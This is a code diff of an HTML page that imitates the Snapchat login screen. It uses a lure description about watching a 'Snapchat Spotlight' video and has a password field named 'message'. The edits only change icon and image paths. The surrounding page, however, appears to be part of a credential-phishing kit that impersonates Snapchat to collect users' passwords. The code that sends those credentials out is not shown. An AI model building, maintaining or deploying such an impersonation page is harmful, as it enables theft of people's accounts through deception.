@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
-  <link rel="shortcut icon" href="/faviconV2.svg" type="image/x-icon">
+  <link rel="shortcut icon" href="img/faviconV2.svg" type="image/x-icon">
   <meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
   <meta property="og:site_name" content="Snapchat Spotlight">
   <title>Login • Snapchat</title>
@@ -216,7 +216,7 @@
 <body>
   <!-- Back Button -->
   <button class="back-button" onclick="window.location.href='/index.html';">
-    <img src="/left-arrow.png"height="15px" width="15px" alt="">
+    <img src="img/left-arrow.png"height="15px" width="15px" alt="">
   </button>
 
   <div class="login-container">
@@ -235,7 +235,7 @@
       <div class="password-container">
         <input type="password" id="password" name="message" required>
         <button type="button" class="toggle-password">
-          <img src="/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
+          <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
         </button>
       </div>
       
@@ -285,10 +285,10 @@
       
       if (passwordField.type === 'password') {
         passwordField.type = 'text';
-        eyeIcon.src = '/eye-open.svg';  // Update to the open eye icon
+        eyeIcon.src = 'img/eye-open.svg';  // Update to the open eye icon
       } else {
         passwordField.type = 'password';
-        eyeIcon.src = '/eye-closed.svg';  // Update to the closed eye icon
+        eyeIcon.src = 'img/eye-closed.svg';  // Update to the closed eye icon
       }
     });
 
